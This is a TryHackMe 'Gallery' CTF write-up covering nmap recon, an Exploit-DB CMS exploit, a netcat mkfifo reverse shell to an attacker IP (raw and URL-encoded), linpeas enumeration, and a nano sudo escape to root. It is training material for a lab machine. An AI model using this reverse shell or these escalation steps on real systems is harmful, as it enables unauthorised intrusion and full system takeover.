---
title: Gallery - Writeup
author: Elman Alizadeh
date: 2022-04-18 14:10:00 +0800
categories: [ctf, TryHackMe]
tags: [tryhackme, gallery]
---

Today we will take a look at TryHackMe: Gallery. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes.

![Desktop View]({{ "/assets/img/thm-gallery/1.png" | relative_url }})

## Question: How many ports are open?

Command: sudo nmap -sS -sC -sV -oN nmap/initial 10.10.157.45

![Desktop View]({{ "/assets/img/thm-gallery/2.png" | relative_url }})

## Question: What’s the name of the CMS?

![Desktop View]({{ "/assets/img/thm-gallery/3.png" | relative_url }})

Answer: S***** I**** G******

I searched for a suitable exploit and found it

[Exploit](https://www.exploit-db.com/exploits/50214)

Let’s exploit.

Command: locate 50214.py

Command: searchsploit -m /usr/share/exploitdb/exploits/php/webapps/50214.py

Command: python 50214.py

![Desktop View]({{ "/assets/img/thm-gallery/4.png" | relative_url }})

## Get Reverse Shell

```console
Command: rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4242 >/tmp/f
```

But first let’s encode

[Url_encode](https://www.urlencoder.org/)

Command: rm%20-f%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.8.223.65%204242%20%3E%2Ftmp%2Ff%0A

Enter these commands after receiving the Reverse Shell

Command: script /dev/null -c bash

Command: export TERM=xterm

Command: ctrl+z

Command: stty raw -echo ; fg

Command: reset

![Desktop View]({{ "/assets/img/thm-gallery/5.png" | relative_url }})

Let’s enumerate the machine with linpeas.sh.

[Linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

![Desktop View]({{ "/assets/img/thm-gallery/6.png" | relative_url }})

Here we found the necessary credentials credentials

![Desktop View]({{ "/assets/img/thm-gallery/7.png" | relative_url }})

Let’s change the user.

Command: su mike

![Desktop View]({{ "/assets/img/thm-gallery/8.png" | relative_url }})

## Privilege Escalation

Let’s look at the file rootkit.sh

![Desktop View]({{ "/assets/img/thm-gallery/9.png" | relative_url }})

Here we can use nano to get a shell. Let’s take a look at this

[Gtfo/nano](https://gtfobins.github.io/gtfobins/nano/)

Command: sudo -u root /bin/bash /opt/rootkit.sh

Command: read

Command: CTRL+R

Command: CTRL+X

Command: reset; sh 1>&0 2>&0

![Desktop View]({{ "/assets/img/thm-gallery/10.png" | relative_url }})

## And now we are the root

![Desktop View]({{ "/assets/img/thm-gallery/1.gif" | relative_url }})

“If you have any questions or comments, please do not hesitate to write. Have a good days”







